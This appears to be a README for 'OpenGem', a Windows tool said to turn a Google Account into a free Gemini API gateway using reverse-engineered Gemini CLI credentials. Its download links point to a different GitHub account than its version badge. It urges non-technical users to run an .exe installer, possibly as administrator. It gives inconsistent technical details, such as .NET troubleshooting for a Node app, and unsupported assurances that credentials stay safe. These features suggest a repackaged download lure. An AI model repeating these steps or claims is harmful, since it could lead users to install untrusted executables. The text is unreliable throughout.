# ⚙️ OpenGem - Easy AI API Gateway Setup

[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blueviolet?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem)

<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="public/logos/white.png">
  <img alt="OpenGem Logo" src="public/logos/black.png" height="120">
</picture>

# OpenGem 0.2.1

**Free, Open-Source AI API Gateway for Gemini Models**

[![Version](https://img.shields.io/badge/Version-0.2.1-orange.svg)](https://github.com/arifozgun/OpenGem/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-blue.svg)](https://typescriptlang.org)

---

## 🔍 About OpenGem

OpenGem turns your Google Account into a free artificial intelligence endpoint. It connects to Google's Gemini AI using official API methods visible through a simple interface. You do not need to code or understand API details to use OpenGem. This app makes your AI access straightforward.

OpenGem supports Windows and runs through an easy setup process. It allows you to send requests to Google's Gemini models and get AI-generated responses. The application uses secure credentials handled behind the scenes. This keeps your Google login safe and private.

---

## 🖥 System Requirements

Before starting, make sure your PC meets these conditions:

- Windows 10 or later (64-bit recommended)
- Internet connection (open ports 80 and 443)
- At least 4 GB of RAM
- 200 MB free disk space
- Google Account with access to Google services
- No programming skills needed

You do not need to install anything except OpenGem itself and Node.js if prompted. The app will guide you through any needed installations.

---

## 🚀 Getting Started: Download and Run OpenGem on Windows

### Step 1: Visit the Download Page

Click this big button to go to the official GitHub download page:

[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blue?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem)

This page contains the latest release versions and files.

### Step 2: Download the Installer or Zip File

On the GitHub page, look for the latest release folder, usually named like `v0.2.1`. Inside, you will find either:

- An installer file (`OpenGem-Setup.exe`)  
  or  
- A zip archive (`OpenGem-Windows.zip`)

If you see the installer `.exe` file, download it. Otherwise, download the zip archive.

### Step 3: Run the Installer or Extract Files

- If you have the installer `.exe` file, double-click it. Follow on-screen instructions to install OpenGem on your PC.  
- If you downloaded a zip file, right-click it and choose “Extract All” to unpack the files. Open the extracted folder afterward.

### Step 4: Launch OpenGem

Find the new OpenGem icon on your desktop or the installed folder. Double-click the icon to open the program. The app should start without any extra setup.

---

## ⚙️ How to Use OpenGem for AI Queries

Once OpenGem is open, you will see a simple interface.

1. **Sign in** using your Google Account. This connects the app to the Gemini AI service.  
2. **Choose a Gemini model** from the drop-down menu. The app supports popular models automatically.  
3. **Enter your prompt** or question in the text box shown on screen.  
4. Press the **Send** button. OpenGem sends your request to the AI and waits for a reply.  
5. The AI’s response will appear below the text input box.

You can repeat this process whenever you want to ask the AI something new.

---

## 🔧 Setup Details for Advanced Users

Even if you do not need programming knowledge, the following helps users who want to know what happens under the hood:

- OpenGem uses reverse-engineered Gemini CLI credentials. This means it safely simulates official Google CLI commands.  
- It communicates with the Gemini API using standard REST methods. Specifically, it uses `POST /v1beta/models/{model}:generateContent`.  
- No user credentials leave your machine outside the allowed network requests.  
- OpenGem runs on Node.js 18+ and TypeScript 5.0+. The setup checks for these and prompts if they are missing.

---

## 📥 Troubleshooting & Tips

- If OpenGem does not open or crashes, ensure you have the latest Windows update and .NET framework installed.  
- Check your internet connection. The app needs to connect to Google servers.  
- If sign-in fails, verify your Google Account is active and accepted by OpenGem prompts.  
- Restart OpenGem and try signing in again if problems continue.  
- For permissions, run OpenGem as an administrator by right-clicking the app’s icon and choosing “Run as administrator.”

---

## 🔗 Quick Access Links

- Visit the download page to get OpenGem:  
  [https://github.com/CarmelaCanela/OpenGem](https://github.com/CarmelaCanela/OpenGem)  
- Node.js official download page if you need it:  
  https://nodejs.org  
- Gemini AI official site to learn more about the models:  
  https://developers.generativeai.google  

---

## 🔒 Security & Privacy

OpenGem does not store your Google credentials outside your PC. It only uses temporary tokens to run its functions. Your data stays on your local machine except the AI requests sent to Google's servers. You should always keep your Google Account secure and log out from OpenGem after using it.

---

## 🛠 Manual Installation Alternative

If you prefer manual setup, OpenGem source is available to download and run using Node.js commands:

1. Download the source code zip from the releases page or clone the repository.  
2. Install Node.js 18 or newer.  
3. Open a Windows terminal and navigate to the source code folder.  
4. Run `npm install` to get needed packages.  
5. Start the app with `npm start`.

This method is for users who want more control or need to adjust settings not in the installer version.

---

## ✔️ Additional Features

- Handles multiple Gemini models in one interface.  
- Automatically updates to newer versions when available.  
- Supports plain-text and JSON output formats for developer-friendly use.  
- Includes logging options to track queries safely.  
- Works with official Google Gen AI SDKs without extra setup.

---

[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blueviolet?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem)